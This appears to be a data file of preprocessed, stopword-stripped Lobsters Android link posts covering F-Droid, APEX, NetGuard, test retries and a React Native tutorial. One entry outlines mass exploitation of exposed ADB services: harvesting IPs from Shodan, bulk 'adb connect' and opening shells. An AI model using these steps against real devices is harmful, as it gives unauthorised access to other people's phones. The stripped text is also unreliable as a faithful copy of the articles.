bulletpoint additionally developer easily perform change himherself automatically reflected next version published con onetime additional step needed establish necessary structure app source repository definitely good idea highly recommended provide screenshots app repo fdroiddata corresponding structure allow different screenshot size corresponding display size phone tablet description different language make life easier fdroid team possibly speed publication new app tag app release eg via git tag make easier pick commit mark version also make possible detect new version update published faster well use gradle standard working best fdroid take care beginning app meet inclusion criterion meaningful description reduces pingpong processing rfp additional detail tutorial faq description add value app necessarily need specific website domain github gitlab notabug etc provide wiki funktionality feel encouraged use maintain screenshots translation per fastlanetriplet app repo appealing presentation hisher language better attracting new user
122,Lobsters,android,Android,Exploiting Android devices running insecure remote ADB service,https://medium.com/@madrobot/exploiting-android-devices-running-insecure-remote-adb-service-4490cc6a2282,exploiting android device running insecure remote adb service,exploiting android device running insecure remote adb service adb shodan,exploiting android device running insecure remote adb service good coding made multiple script p adb android debug bridge adb versatile commandline tool let communicate device adb command facilitates variety device action installing debugging apps provides access unix shell use run variety command deviceusually developer connect adb service installed android device using usb cable also possible use adb wireless enabling daemon server tcp port devicechecking shodan using dorkandroid debug bridge product android debug bridge let grab ip shodan apimade oneliner bash script meadd api script executingbash shodanadbshyou get heregot json response shodan search total page oneliner grep ip make single filebash grepipsh iptxtyou get heregot around link list herenext need add adb using adb connect ip portoneliner add ip iptxt adbbash adbconnectshyou get hereaccessing list connected adb use adb devicesuse script adbsh list order access like hereadb adbsh shelldonelogout
123,Lobsters,android,Android,Collaborative Web Scraping on Android,https://github.com/Scraper-Club/Android-Scraper-Club,collaborative web scraping android,http androidscraperclubcom join github today sign file permalink androidscraperclub work api url scrape http androidscraperclubcom resource license reload reload,http androidscraperclubcom experimental technique share mobile phone scraper worker coordinated central server since normal phone running normal android normal mobile ip indistinguishable typical mobile user dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time androidscraperclub work earn credit leaving app open scraping mode p make sure keep plugged screen must scraping work spend credit logging scraperclubcom uploading list scraping target p everything automated api check status scraping target url processed fellow scraper club member download raw html scrape everything via api http androidscraperclubcom experimental technique share mobile phone scraper worker coordinated central server since normal phone running normal android normal mobile ip indistinguishable typical mobile user resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
124,Lobsters,android,Android,APEX in Android Q: The Biggest Thing Since Project Treble,https://www.xda-developers.com/android-q-apex-biggest-thing-since-project-treble/,apex android q biggest thing since project treble,apex android q could biggest thing since project treble project treble apex change way library updated apex package installed structured adb androidmanifestxml metainf image installed boot purpose device going support apex,apex android q could biggest thing since project trebleimplementing apex probably biggest headache google faced since introduction project treble apex introduction change android idea behind apex rather common everyday gnulinux distribution package update targeting specific section linux library set something google never tried given android used ro readonly partition system library framework stored versus usual rw readwrite partition used linux distribution rendering standard upgrade process unsuitablelibraries precompiled code used program commonly used method made library android apps call reducing size apks code need reimplemented across multiple apps find many preinstalled system library systemlib directory android system library usually updated get updated part android platform upgrade via ota update hand library linux distros may updated individually introduction apex system library android updated individually like android apps main benefit app developer able take advantage updated library without waiting oem roll full system upgrade let dive technical detail apex workshow apex change way library updated apex ecosystem forced rather forcing google reconsider way android load library file nonstandard partition different systemfirst specify difference shared library static library shared library library usually file named libkindso include code needed run library actually providing code static library guess library depend library everything included statically within fileandroid historically configured library path known ldlibrarypath linux world single file called ldconfigtxt configure allowed search path shared library needed either binary another library path hardcoded configuration expandable layout including readonly system partition lead unupdateable library unless user installs ota android update google fixed issue allowing extend search path letting single apex package provide ldconfigtxt included extra updated library path contained themwhile move fixed one main issue still serious issue overcome first abi application binary interface stability library always export stable set interface allow apps library continue work protocol even upgraded library google actively working trying create stable c interface apexed librariesbut apex limited library binary alone fact contain configuration file timezone update java framework conscrypt time writing example current apex package provided aosp comandroidruntime art bionic runtime binary library comandroidtzdata timezone icu data library configuration data comandroidresolv library used android resolve network related request library comandroidconscrypt java security provider java framework apex package installed structured apex package simple zip archive like apk installed handy adb point development later user via package manager like google play manually android package installer zip layout follows dive thatthe apexmanifestjson specifies package name versionthe apexpayloadimg microfilesystem image formatted file part verification process used install package lookthe presence androidmanifestxml even used mainly application help u understand implementation used standard apk installation reused even package fact extension checked differentiate themthe metainf directory package certificate us mechanism normal apks package verified privatepublic key pair runtime user allowed install update enough google added layer security using dmverity check integrity image avb android verified boot verification make sure image come trusted source worst case scenario apex package rejectedif verification step successful image marked valid replace system variant next reboothow image installed boot start taking look apex currently installed device emulator see preinstalled package stored systemapex currently version number happens apex activated using comandroidtzdata reboot device analyze logcatthe first line provide enough information understand origin going installed apex new directory introduced android q used store activated packagesafter package successfully verified avb public key match apex mounted using loop device making file system accessible system loop device pseudodevice make file accessible block device making content file accessible mount pointat point apex still used suffix indicates package version finally let system know package successfully activated bindmounted apexcomandroidtzdata android actively expects tzdata live bind mount overlay existing directory file different point apex implementation entirely contained single repository aosp apexd apex daemon directory code running android apexer directory code used build system create apex purpose point speculate best guess google trying create core set apex package updated google possibly create unified base core android shared vendor making update possible using single package updatesare device going support apex example apexd requires dataapex available right boot update android module fde fulldisk encryption dataapex encrypted device unlocked user rendering apex basically useless system apex variant loaded boot device supporting apex need kernel patch many fix found google playing loop device source
125,Lobsters,android,Android,Dont kill my app,https://dontkillmyapp.com/,dont kill app,kill apps make work read news dontkillmyapp benchmark,kill apps make work android manufacturer listed prefer battery life proper functionality apps see fix read news see phone dontkillmyapp benchmark app play store
126,Lobsters,android,Android,"Introducing Square In-App Payments SDK for iOS, Android & Flutter",https://medium.com/square-corner-blog/introducing-square-in-app-payments-sdk-1fc93b32814c,introducing square inapp payment sdk io android flutter,http developersquareupcomblog mobile accounted sale square inapp payment sdk online inperson inapp brushfire jorin slaybaugh technology lead brushfire work get started visit documentation site learn head developer dashboard create new application add sdk customize ux match look feel app instantiate card entry view adam robinson chief product officer pepperhq pepperhq documentation http squareupcomdevelopers squreslack additional reading,head moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogit surprise mobile commerce continues gain popularity example mobile accounted sale black friday cyber monday built square developer platform past year developer community asking ability take payment square natively within mobile app running buyer device listened community worked tirelessly deliver inapp payment experience truly life square standardstoday thrilled launch square inapp payment sdk enables developer accept squarepowered payment within mobile apps allows buyer securely pay physical good service purchased mobile app well add credit card profilethe square inapp payment sdk round square omnichannel developer platform meaning developer build online inperson inapp payment solution square mean le time spent building maintaining multiple payment integration also mean backoffice reporting seamlessly unified single system making easy business make datadriven decisionsbrushfire fastgrowing ticketing registration platform using sdk beta program able quickly integrate square inapp payment sdk mobile apps use square power kiosk event implementing inapp payment sdk mobile app allowed customer easily buy ticket marquee event increasing conversion square inapp payment sdk painless easy use loved technical standpoint allowed u something literally impossible u able easier ever matter developer jorin slaybaugh technology lead brushfireas apis sdks square handle payment complexity like maintaining pci compliance mitigating fraud managing dispute keeping buyer data secure behalf developer use square inapp payment sdkhow workscustomizable component square inapp payment sdkthe sdk feature interactive ux securely collect credit card information buyer tokenizes developer need deal raw credit card information kept pci scope sdk allows developer fully customize different piece ux match look feel appdigital wallet support square inapp payment sdkdigital wallet like apple pay google pay also supported help developer increase conversion provide smoother buyer experience developer also option securely storing card file repeat buyer reenter card next timeget startedit easy get started inapp payment visit documentation site learn head developer dashboard create new add customize ux match look feel app instantiate card entry viewiosandroidwhen buyer enter credit card detail app sdk tokenizes detail return nonce singleuse token refers credit card detail send nonce backend use connect apis charge customer create card file sdk square took care lot heavy lifting storing card information processing transaction square inapp payment sdk slicker implementation option market felt frictionless beginning able customize look feel flow look way client want still feel native app trustworthy honest adam robinson chief product officer pepperhqpepperhq company creates customized merchantbranded mobile apps hospitality company looking mobile payment order ahead solution morewe excited see build sdk square inapp payment sdk available united state canada united kingdom australia japan starting today learn square inapp payment sdk documentation learn square developer platform visit http squareupcomdevelopers join community squreslacknote square support apple pay google pay usd transactionsadditional reading
127,Lobsters,android,Android,The Unreasonable Effectiveness of Test Retries: An Android Monorepo Case Study,https://engineering.shopify.com/blogs/engineering/unreasonable-effectiveness-test-retries-android-monorepo-case-study,unreasonable effectiveness test retries android monorepo case study,nt qa team qa culture mobile apps cosmic ray monorepo independent failfast simply retrying failing test theoretical pas rate full ci suite increase retriable failure fatal failure test failure gradle improving ci infrastructure engineering career page,shopify nt qa team qa culture mean rely automated testing ensure quality mobile apps reliable continuous integration ci system allows developer focus building highquality system knowing confidence something wrong test suite catch create confidence extensive test suite include integration test unit test screenshot test instrumentation test linting every large test suite enemy flakiness flaky test exhibit passing failing result code requires resilient system recover failure test fail different reason related test network infrastructure problem bug software run test even cosmic ray last year moved android apps library monorepo increased size android team meant people working codebase test executed commit merged master run entire test suite master branch branch test related changed run logical pas rate test suite took hit let assume every test execute independent event like network flakiness affect test taking account pass time execute pipeline contain test given probability test estimate pipeline pas time however entire test suite made pipeline pas probability pas time good improve ci pas rate developer lose trust test infrastructure ci red time due test flakiness infrastructure issue start assuming every failure false positive caused flakiness happens lost battle gaining developer trust back difficult decided tackle problem simplest way retrying failure retries simple yet powerful mechanism increase pas rate test suite executing test believe failfast system earlier get feedback faster move end goal using retries may sound counterintuitive almost always slightly slower build preferable user manually retry build flaky failure retrying test chance failing ci due single test would require test fail twice using assumption chance happening test translates pas rate test performing calculation pipeline would expect pas rate entire ci suite simply retrying failing test theoretical pas rate full ci suite increase build many different system involved thing go wrong setting test environment docker fail load container bundler fail installing dependency git fetch failure retried identified retriable failure mean retried within job need initialize entire test environment failure easy retry job side effect known fatal failure need reload test environment altogether slower retriable failure definitely faster waiting developer retry job manually spend time trying figure certain task failed finally realize solution retrying finally test failure seen test flaky fail multiple reason based data screenshot test flakier rest detect failure test single test retried three time message displayed test fails retried retries general test retries particular ideal work make ci slower hide reliability issue end day want developer reliable ci encouraging fix test flakiness possible reason detect test pas retry notify developer problem go unnoticed think test pass second attempt treated like failure warning something improved reduce flakiness build tip recommend besides retry mechanism nt depend unreliable component build try identify unreliable component system depend possible unfortunately time possible need unreliable component work making component reliable try understand component reliable enough use case component control make change increase reliability apply caching invoke unreliable component le often need interact external service different reason common case download dependency instead downloading every build build cache reduce interaction external service therefore gaining resiliency tip exactly infrastructure point view project started pas rate android app pipeline identifying applying retry mechanism source flakiness adding cache gradle build managed increase almost pas rate plot march september something similar happened io repository improving ci infrastructure adding previously discussed retry mechanism applying tip reduce flakiness pas rate grew may sound counterintuitive thanks retries move faster slower build love talk mobile tooling feel free reach u comment want know share solution problem intrigued shopify hiring love hear please take look open position engineering career page
128,Lobsters,android,Android,NetGuard non-root Android firewall to block internet access per app or host,https://github.com/M66B/NetGuard,netguard nonroot android firewall block internet access per app host,netguard block ad using host file compatibility faq faq work profile secure folder copperheados ipsec mcc mnc ip address frequently asked question faq use netguard netguard completely protect privacy use another vpn application using netguard use netguard android version netguard use extra battery power netguard send internet traffic external vpn server application without internet permission shown need enable google store app work vpn service restarted provide tasker plugin remove ongoing netguard entry notification screen ca nt select ok approve vpn connection request fdroid build supported application shown dimmed netguard using much memory ca nt find netguard google store app application xyz still internet access greenifyhibernate netguard doze mode affect netguard tether use android hotspot use wifi calling using netguard remove notification status bar add select read blocked traffic log google connectivity service allowed internet access default get item requested available purchase also run afwall device application configured group batterynetwork usage netguard high add profile add condition foreground vpn start add pin password protection pro feature expensive netguard stop running vpn based firewall differ iptables based firewall add schedule add wildcards permission needed get app causing device run slowly nt get notification access netguard handle incoming connection get refund application advertisement domain name blocked set allowed netguard encrypt internet traffic hide ip address netguard automatically start boot netguard block internet traffic lockdown mode translation language missing incorrect incomplete tunnel tcp connection tor network netguard connect amazon ipinfoio netguard allows internet traffic netguard use much data loading application list take long time help restore purchase ip wifi callingsmsmms work help netguard crashed solve problem parsing package dns traffic allowed add dns tl netguard block support use xdadevelopers forum thread netguard supported phone tablet device type like television car contributing attribution license gnu general public license version http wwwgnuorglicenses trademark,netguard netguard provides simple advanced way block access internet root required application address individually allowed denied access wifi andor mobile connection blocking access internet help reduce data usage save battery increase privacy netguard first free open source noroot firewall android feature simple use root required open source calling home tracking analytics actively developed supported android later supported tcpudp supported tethering supported optionally allow screen optionally block roaming optionally block system application optionally forward port also external address available installed play store optionally notify application access internet optionally record network usage per application per address optionally block ad using host file available installed play store material design theme light dark theme pro feature log outgoing traffic search filter access attempt export pcap file analyze traffic allowblock individual address per application new application notification configure netguard directly notification display network speed graph status bar notification select five additional theme light dark version noroot firewall offering feature requirement downloads certificate fingerprint cc dc usage enable firewall using switch action bar allowdeny wifimobile internet access using icon along right side application list use setting menu change blacklist mode allow setting block unwanted application list whitelist mode block setting allow favorite application list redorangeyellowamber internet access denied tealbluepurplegrey internet access allowed screenshots see compatibility way build noroot firewall android use android vpn service android nt allow chaining vpn service use netguard together vpn based application see also faq netguard used rooted device even offer feature root firewall android version especially samsung android version buggy vpn implementation result android refusing start vpn service certain circumstance like internet connectivity yet starting device incorrectly requiring manual approval vpn service starting device netguard try workaround remove error message succeeds else luck lineageos version broken android vpn implementation causing traffic blocked please see faq information netguard supported apps installed work profile secure folder samsung android vpn service often work correctly situation ca nt fixed netguard filtering mode used copperheados netguard work crash package comandroidvpndialogs removed otherwise unavailable removing package possible root permission disable package enable command adb shell pm enable user comandroidvpndialogs netguard supported phone tablet device type like television car android allow incoming connection incoming traffic android vpn service support either therefore managing incoming connection server running device supported wifi ip calling work provider us ipsec encrypt phone call sm message andor mm message unless made exception netguard provider currently tmobile verizon happy add exception provider need mcc code mnc code ip address range provider using alternative enable option disable call available since version frequently asked question faq use netguard netguard completely protect privacy use another vpn application using netguard use netguard android version netguard use extra battery power netguard send internet traffic external vpn server application without internet permission shown need enable google store app work vpn service restarted provide tasker plugin remove ongoing netguard entry notification screen ca nt select ok approve vpn connection request fdroid build supported application shown dimmed netguard using much memory ca nt find netguard google store app application xyz still internet access greenifyhibernate netguard doze mode affect netguard tether use android hotspot use wifi calling using netguard remove notification status bar add select read blocked traffic log google connectivity service allowed internet access default get item requested available purchase also run afwall device application configured group batterynetwork usage netguard high add profile add condition foreground vpn start add pin password protection pro feature expensive netguard stop running vpn based firewall differ iptables based firewall add schedule add wildcards permission needed get app causing device run slowly nt get notification access netguard handle incoming connection get refund application advertisement domain name blocked set allowed netguard encrypt internet traffic hide ip address netguard automatically start boot netguard block internet traffic lockdown mode translation language missing incorrect incomplete tunnel tcp connection tor network netguard connect amazon ipinfoio netguard allows internet traffic netguard use much data loading application list take long time help restore purchase ip wifi callingsmsmms work help netguard crashed solve problem parsing package dns traffic allowed add dns tl netguard block support question feature request bug report please use xdadevelopers forum thread support latest version netguard support thing directly related netguard support building developing thing netguard supported phone tablet device type like television car contributing building building simple install right tool native code built part android studio project expected solve build problem support building build prebuilt version netguard available translating translation language welcomed translate online language listed please send message marcel plus netguard faircode dot eu see status translation please note contributing agree license including copyright without additional term condition attribution netguard us license gnu general public license version copyright c marcel bokhorst right reserved file part netguard netguard free software redistribute andor modify term gnu general public license published free software foundation either version license discretion later version netguard distributed hope useful without warranty without even implied warranty merchantability fitness particular purpose see gnu general public license detail received copy gnu general public license along netguard see http wwwgnuorglicenses trademark android trademark google inc google play trademark google inc
129,Lobsters,android,Android,System-wide adblocking on Android using DNS-over-TLS,https://github.com/eldridgea/erised,systemwide adblocking android using dnsovertls,erised see want see adblocking using dnsovertls pihole prerequsistes docker docker compose deploying detail using android,erised see want see adblocking using dnsovertls project goal blocking unwanted ad tracker etc across entire operating system web apps currently focusing android since major o native dnsovertls implementation group container accept incoming dnsovertls doh request pas pihole blocker pas upstream encrypted dns server note currently deploys caddy container using caddy install using personal license make sure change require commerical license prerequsistes deploying need install docker install docker compose get dns aaaa record pointing server ip open port firewall get certificate actual service deploying clone repo git clone http githubcomeldridgeaerisedgit change cloned directory run build command replacing yourhostname hostname youremail email cd erised dockercompose build buildarg erisedhostyourhostname buildarg erisedemailyouremail done run dockercompose run dockercompose want logging output terminal detail deploy stack three container cloudflared encrypt dns query passing upstream pihole filter unwanted result caddy allow incoming dns request use tl dns request look like device caddy pihole cloudflared cloudflare service using android dnsovertls built feature android pie later used android use dns server request network allows systemwide blocking apps network without need alwayson vpn use open android setting network internet advanced private dns select private dns provider hostname option enter hostname used dns record build command
130,Lobsters,android,Android,Design and Develop an Android App with React Native and Publish to Google Play Store,https://developer.okta.com/blog/2018/12/26/react-native-android-play-store,design develop android app react native publish google play store,mega project list prime factorization determine interface theming react native app styled component work great react native entire page set android production environment install android studio install jdk oracle java sdk sdkman add react native cli initialize skeleton node installed version init connect android phone run emulator installed android studio note reduce output size android app conflicting configuration ndk abifilters add linting react native app eslint airbnb configuration eslint ctrl alt e cmd option e one vscode eslint fix add styled component react native styled component add custom font react native app racing sans one adjust app fullscreen android create android app component related online tutorial styling example install chathura font available google font react property touchablehighlight hacked work styled component install orbitronbold google font add color android app android oreo fixed color management android user wire button react lifting state need capture state javascript class react constructor destructures modifying state react top use class property correctly react update react native app display clear add screen android app press calculate prime factor display list react native go pulling react native app together back go back go set android app name icon new image asset stack overflow fix add authentication appauth sign free okta developer account application add application native next done login redirect uri client id reactnativeappauth redirect url alert authorize revoke launch android app play store great advice prelaunch checklist sign developer account create icon android app iconic create android application play store console create application create feature graphic pixabay one gimp save draft app release app release track app signing google play generate upload key build generate signed bundle apk apk next key store path create new next signature version finish add app permission behind scene content rating content rating content rating pricing distribution available ready publish releasing android app app release confirm pending publication note learn android react native secure user management google play store available github twitter facebook linkedin subscribe youtube channel,mobile app usage expected continue grow good time get market android far popular o worldwide dominant way get android apps phone user google play store tutorial build react native app walk everything pick design well setting react native environment tip getting editor publishing google play eventual app look like tutorial checked karan goel mega project list project inspiration building prime factorization problem take number return prime factor determine interface theming react native app outside application logic ui theming decision important make app includes control like dropdowns button well layout screen since using reactbased technology going use styled component popular lightweight approach theming react application also work great react native entire page listing component componentsystems based styled component tutorial using styled component build component set android production environment order build eventual apk format app upload store need install android studio done make sure sdk version react native us install jdk also need make sure recent java development kit installed like version installation differs depending platform use oracle java sdk use sdkman install option like openjdk add react native cli initialize skeleton next install react native command line interface make sure node installed varies depending operating system using version npm install g reactnativecli command reactnative available includes init option reactnative init primecomponents create primecomponents directory put react native project inside runnable skeleton change directory connect android phone run emulator installed android studio run project note android studio prompt open project create emulator point primecomponentsandroid directory cd primecomponents reactnative runandroid see output upload play store go androidappbuildoutputsapkdebug see appdebugapk around size reduce output size android app want make sure user smallest download possible already quite small around using command line something like expo produce even basic apps reduce http mediumcom go androidappbuildgradle change following variable true def enableseparatebuildpercpuarchitecture true def enableproguardinreleasebuilds true also remove ndk section defaultconfig removing conflicting configuration ndk abifilters error ndk abifilters rerunning reactnative runandroid see two much smaller apks output directory add linting react native app writing javascript like react requires tool ensure made obvious mistake big help beginner common eslint plugged right project editor first add linter using npm npm install eslint babeleslint one common set plugins airbnb configuration add npm install eslintconfigairbnb eslintpluginreact eslintpluginimport put following eslintrcjs need create file moduleexports extends airbnb parser babeleslint env jest true rule nousebeforedefine reactjsxfilenameextension reactproptypes commadangle globals fetch false need add plugins editor sublime eslint give output error issue ctrl alt e cmd option e mac also one vscode lot error fixed automatically using eslint fix command run editor eslint fix package add styled component react native react react native build interface using web technology ie html cs javascript one popular library use react react native styled component clean one add cs component example take look following code taken react native sample app get reactinit export default class app extends component prop render return view style stylescontainer text style styleswelcome welcome react native text text style stylesinstructions get started edit appjs text text style stylesinstructions instruction text view const style stylesheetcreate container flex justifycontent center alignitems center backgroundcolor welcome fontsize textalign center margin instruction textalign center color marginbottom declare dom element view text linking style create stylesheet later styled component would following const container styledview flex justifycontent center alignitems center backgroundcolor const welcome styledtext fontsize textalign center margin const instruction styledtext textalign center color marginbottom export default class app extends component prop render return container welcome welcome react native welcome instruction get started edit appjs instruction container cleaner portable cs name clash etc install run npm install styledcomponents root directory add custom font react native app get custom font like racing sans one application first need download ttf put assetsfonts need create directory add following packagejson rnpm asset assetsfonts finally run reactnative link command line see font inside androidappsrcmainassetsfonts able use create component folder put following inside componentsheaderjs import styled styledcomponentsnative export default styledtext color black fontfamily racingsansoneregular fontsize margintop backgroundcolor transparent textalign center import appjs add heading welcome heading text node import header componentsheader export default class app extends component prop render return view style stylescontainer header welcome header text style styleswelcome welcome react native text text style stylesinstructions get started edit appjs text text style stylesinstructions instruction text view get nicely formatted header adjust app fullscreen android get app show title bar go androidappsrcmainresvaluesstyledxml add following inside style element item name android windowfullscreen true item rerun see navigation bar gone create android app component take long time decide final design layout color font often iterative process go build final result saw start inspired related online tutorial styling example remember take time get something like change appjs following import react react import container header input keypad buttonrow component const app container header prime component header input input keypad buttonrow key buttonrow key buttonrow key buttonrow key clear go keypad container export default app see clean thing styled component header input keypad name choose surrounded container superfluous information styling happens component create component directory inside componentsindexjs put following export default input input export default container container export default header header export default keypad keypad export default button button export default buttonrow buttonrow convenience module allows importing appjs ie import container header input keypad buttonrow component otherwise import component separate line put componentscontainerjs note must use capital letter component react native import styled styledcomponentsnative export default container styledview flex simple extending view component assigning flex value one context mean take everything componentsheaderjs import styled styledcomponentsnative export default header styledtext flex fontsize fontfamily chathuraextrabold backgroundcolor rgb color gold textalign center also styled text component large centered font gold color grey background make sure install chathura font google font componentsinputjs import styled styledcomponentsnative export default input styledtext flex textalign right fontfamily audiowideregular textalignvertical center fontsize color firebrick backgroundcolor gold similar except audiowideregular font also available google font componentskeypadjs import styled styledcomponentsnative export default keypad styledview flex backgroundcolor rgb paddingtop paddingbottom also styled view essentially container like div html componentsbuttonrowjs import react react import styled styledcomponentsnative import button const rowbox styledview flex flexdirection row export default buttonrow key rowbox http keysmap key button text key key key rowbox thing get complicated importing button current directory create second creating component called rowbox exported buttonrow defined react property called key mapping key button component clean way looping array using value set text key attribute must set key attribute make dom object unique using text render button componentsbuttonjs import react react import styled styledcomponentsnative http http const buttonbox styledtouchablehighlightattrs underlaycolor flex alignitems center justifycontent center backgroundcolor rgb borderradius margin const buttontext styledtext fontsize fontfamily orbitronbold color prop propstext go green orange handlebuttonpress value export default button text buttonbox onpress handlebuttonpress buttontext text text text buttontext buttonbox last component start creating buttonbox act container whole button using touchablehighlight react native component change color touched styling normal except underlay color color see touching since need hacked work styled component next buttontext text control install orbitronbold google font color set using boolean check another great feature styled component fullcss support essentially color green text go orange otherwise next define function handle button press empty export button component combine two set text attribute buttontext using property set button styled component see set style done see app render saw top article add color android app color android emulator may always match viewing actual phone android oreo fixed color management ensure thing looked across device similar issue see using android could restrict user android right android user probably best put message somewhere thing look bit better later version wire button react basic design layout need connect button actually something start need make pressing number clear key add remove number number display need understand state react lifting state need single source truth current number displayed callback function modify parent input button since part app put app component appjs start modifying appjs converting react class current functional definition since need capture state import react react import container header input keypad buttonrow component class app extends reactcomponent render return container header prime component header input input keypad buttonrow key buttonrow key buttonrow key buttonrow key clear go keypad container export default app app javascript class render method return jsx reload emulatorapp emulator use rr still render add following render method constructor prop super prop thisstate overriding react constructor calling parent always must setting state json object one member number initialized old value add return appjs destructures state local variable change input line input statenumber input input rendered state reload see output change state constructor see changing modifying state react need tell button call function defined app class add following constructor thispress thispressbind make press function access needed called thissetstate next define press function alert button pressed press value alert value pas function button row buttonrow func thispress key buttonrow func thispress key buttonrow func thispress key buttonrow func thispress key clear go modify buttonrow take value pas created button export default buttonrow func key rowbox keysmap key button func func text key key key rowbox finally change button take function call pressed button also remove previous button handler export default button func text buttonbox onpress func text buttontext text text text buttontext buttonbox press button see alert pressed single function defined top control button use class property correctly react clean thing bit use class property initialize state react simply take constructor replace state number update react native app display number button pressed need add said number current number also clear pressed delete first change press following press value let number thisstate value clear number mathfloor number thissetstate number first pull value number state using destructuring using linter previously see preferred key clear divide number ten floor ie remove last digit set state enough make clear button work add following statement press else value go number number value thissetstate number go pressed value le one million stop somewhere phone fast add value back interpreting string instead integer set state make every button work thing left go button add screen android app go button pressed want hide keypad show progress screen need another state variable boolean add state class property ie state number processing false also add check go press function else value go thissetstate processing true create componentsprocessingjs import react react import styled styledcomponentsnative const processingbox styledtext flex fontsize textalign center textalignvertical center fontfamily orbitronbold color red backgroundcolor rgb paddingtop paddingbottom export default processingbox processing processingbox add componentsindexjs export default processing processing import top appjs import container header input keypad buttonrow processing component use processing boolean decide whether render keypad stateprocessing processing keypad buttonrow func thispress key buttonrow func thispress key buttonrow func thispress key buttonrow func thispress key clear go keypad check stateprocessing true show processing otherwise show keypad calculate prime factor simplest way break number prime factor looping number since anything greater factor check divide however number prime also check factor prime clever algorithm described start keep dividing num case add list divide anymore num addfactor num num odd start process except go square root num incrementing odd number int mathfloor mathsqrt num num addfactor num numi note use floor javascript dealing thing like square root number javascript float actually double similarly keep adding divisor factor remainder left last step check number left great must prime num addfactor num putting together shortly code need display result display list react native display list need use react native list view cast flatlist take list value object called data way render item called renderitem flatlist data key key b renderitem item text itemkey text change componentsprocessingjs following import react react import flatlist reactnative import styled styledcomponentsnative const processingbox styledview flex backgroundcolor rgb paddingtop paddingbottom const header styledtext fontsize textalign center textalignvertical center fontfamily orbitronbold color red paddingtop const item styledtext fontsize textalign center textalignvertical center fontfamily audiowideregular color firebrick export default processingbox header processing header flatlist data key key key key renderitem item item itemkey item processingbox processingbox header item combined export see following click go pulling react native app together make work app need control rendering outside change render method following export default running factor press processingbox running header processing header header finished header list data factor renderitem item item itemkey item running button func press back text back processingbox control take three variable control header shown prime factor displayed function used switch parent state function used button pressed respectively flatlist replaced list styled component control size list rendering add following processingjs const list styledflatlist flex also button control import import button move appjs change processing tag render processing running staterunning factor statefactors press thispress passing three parameter discussed first two state change state property include new value state number factor processing false running false app class put function calculating prime getprimes n const factor let num n num factorspush key num let mathfloor mathsqrt num num factorspush key num num factorspush key num return factor finally change press function get factor set state using well respond correctly back button processing screen press value let number thisstate value clear number mathfloor number thissetstate number else value go value back number number number value else number value thissetstate number else value go thissetstate processing true let factor thisgetprimes number thissetstate running false thissetstate factor else value back thissetstate processing false run app press go see list prime factor well back button take back editing number reclicking go get new list factor congrats finished app set android app name icon make thing look good deployed phone need set name icon set name androidappsrcmainresvaluesstringsxml resource string name appname prime component string resource icon best open project android studio use android directory create drawable directory asset rightclick say new image asset let import large icon overwrite iclauncher used launcher icon generating version need play store redeploy reactnative runandroid see proper name icon apps list get bundling issue next time run reactnative runandroid running android stack overflow fix work add authentication appauth authentication may missioncritical calculator often wise add app feature remain simple add feature may want give user option save calculation history share work friend feature require kind secure user management okta make simple first add new loginjs component copying buttonjs changing font size border radius margin zero background color something lighter like rgb import react react import styled styledcomponentsnative const buttonbox styledtouchablehighlightattrs underlaycolor flex alignitems center justifycontent center backgroundcolor rgb borderradius margin const buttontext styledtext fontsize fontfamily orbitronbold color orange export default login func text buttonbox onpress func text buttontext text text text buttontext buttonbox add indexjs component directory import top appjs add loggedin false app class state finally input control render put switch determine print login button stateloggedin login text logout login text login rerun project see new login button note seeing change code reflected reactnative runandroid deploy might removed internet permission androidmanifestxml react native us connect app development machine simply replace application directive usespermission android name androidpermissioninternet next need sign free okta developer account login navigate application add application select native click next choose name click done note login redirect uri theclient id since add app install reactnativeappauth link reactnative install reactnativeappauth reactnative link reactnativeappauth add following defaultconfig section android config androidappbuildgradle using base redirect url eg defaultconfig applicationid comprimecomponents manifestplaceholders appauthredirectscheme redirectbase top appjs import alert react native package authorize revoke app auth package import alert reactnative import authorize revoke reactnativeappauth define app class add config variable detail okta app const config issuer http youroktadomain clientid clientid redirecturl redirecturl additionalparameters scope openid profile email offlineaccess find value youroktadomain okta dashboard logged add accesstoken state initialization add following two function app class state accesstoken authorize async try const authstate await authorize config thissetstate loggedin true accesstoken authstateaccesstoken catch error alertalert failed log errormessage revoke async try const state await revoke config tokentorevoke stateaccesstoken sendclientid true thissetstate accesstoken loggedin false catch error alertalert failed revoke token errormessage finally add func thisauthorize attribute login button func thisrevoke logout button stateloggedin login text logout func thisrevoke login text login func thisauthorize rerun click login redirected okta login screen using login detail user attached okta application redirect back app showing logout button click logout log notice prompted log fix add login prompt additionalparameters const config additionalparameters prompt login scope openid profile email offlineaccess ensures user prompted password every time launch android app play store last step publishing done play store standard doc great advice well prelaunch checklist besides reading developer policy need sign developer account pay registration fee need create icon create icon android app easy making something unique striking well relevant app tutorial check iconic mobile app play store link free icon repository let edit create graphic like following create android application play store console open play console click create application select default language enter name click create see lot need fill store listing including least short description long description two screenshots feature graphic highres icon categorization app type category email address also need specify providing privacy policy feature graphic need something exactly get royalty free image pixabay example one though resize something like gimp make sure pixabay image free commercial use done click save draft see large green tick side panel next store listing show completed listing detail still need fill content rating form well pricing distribution although need put app release app release click app release sidebar see list track various testing phase click manage production track click create release see message using app signing google play new feature put managing key google hand reason want simple manage key lose longer able release update app fact create new one new name however note option using need generate upload key open app android studio browsing android folder react native project go build generate signed bundle apk select apk click next key store path click create new choose path like homekarlkeystoresandroidjks choose password keystore key enter certificate information note displayed app certificate click ok click next select signature version click finish build start see inside androidapprelease project one device architecture try upload apps get error saying app using permission require privacy policy react native add app permission behind scene force included must first add xmlns tool http schemasandroidcomtools manifest element androidappsrcmainandroidmanifestxml add following see previous link usespermission tool node remove android name androidpermissionreadphonestate usespermission tool node remove android name androidpermissionwriteexternalstorage usespermission tool node remove android name androidpermissionreadexternalstorage also remove alert window internet usespermission since using rebuild reupload put release note click save content rating release made enter rating information go content rating sidebar read message iarc click continue type click utility bottom questionnaire show click field click save questionnaire click calculate rating see list app rated scroll bottom click apply rating put tick next content rating thing left pricing distribution pricing distribution section also straightforward since charging app simply select available button top country column select country available select childdirected contains ad check content guideline u export law checkboxes click save draft top play console say ready publish releasing android app go app release click edit release scroll bottom click review click start rollout production click confirm app say pending publication top need wait hour google check app releasing note might worthwhile using testing release first make sure everything work release production ie everyone learn android react native secure user management congrats finished choosing designing developing android app using react native well publishing play store hope found tutorial enlightening go make something useful publish find app built blog post google play store app source code available github interested learning app design react native secure user management okta check following resource like learned today follow u twitter like u facebook check u linkedin subscribe youtube channel
